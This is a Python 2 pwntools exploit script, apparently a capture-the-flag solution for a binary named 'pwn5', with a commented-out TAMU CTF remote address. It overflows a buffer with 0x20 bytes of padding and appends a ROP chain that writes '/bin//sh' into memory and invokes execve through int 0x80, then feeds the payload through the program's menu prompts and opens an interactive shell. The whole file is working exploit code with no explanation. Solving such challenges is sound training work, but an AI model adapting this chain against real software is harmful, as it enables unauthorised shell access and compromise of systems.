#!/usr/bin/env python2
from pwn import *

context.log_level = 'debug'

binary = './pwn5'

# Padding goes here
p = ''
p += pack(0x0807338a) # pop edx ; ret
p += pack(0x080f0060) # @ .data
p += pack(0x080bc396) # pop eax ; ret
p += '/bin'
p += pack(0x0805512b) # mov dword ptr [edx], eax ; ret
p += pack(0x0807338a) # pop edx ; ret
p += pack(0x080f0064) # @ .data + 4
p += pack(0x080bc396) # pop eax ; ret
p += '//sh'
p += pack(0x0805512b) # mov dword ptr [edx], eax ; ret
p += pack(0x0807338a) # pop edx ; ret
p += pack(0x080f0068) # @ .data + 8
p += pack(0x080496b3) # xor eax, eax ; ret
p += pack(0x0805512b) # mov dword ptr [edx], eax ; ret
p += pack(0x080481d1) # pop ebx ; ret
p += pack(0x080f0060) # @ .data
p += pack(0x080e4325) # pop ecx ; ret
p += pack(0x080f0068) # @ .data + 8
p += pack(0x0807338a) # pop edx ; ret
p += pack(0x080f0068) # @ .data + 8
p += pack(0x080496b3) # xor eax, eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x0807ebcf) # inc eax ; ret
p += pack(0x08071005) # int 0x80

#io = remote('pwn.ctf.tamu.edu', 4325)
io = process(binary)

#gdb.attach(io, '''
#	b *0x08048B55
#''')

#offset = 32 = 0x20
payload = 'a'*0x20 + p

#io.recvuntil('What is your first name?: ')
io.sendline('a')
#io.recvuntil('What is your last name?: ')
io.sendline('b')
#io.recvuntil('What is your major?: ')
io.sendline('c')
#io.recvuntil('Are you joining the Corps of Cadets?(y/n): ')
io.sendline('y')
#io.recvuntil('4. Study\n')
io.sendline('2')
#io.recvuntil('What do you change your major to?: ')
io.sendline(payload)

io.interactive()





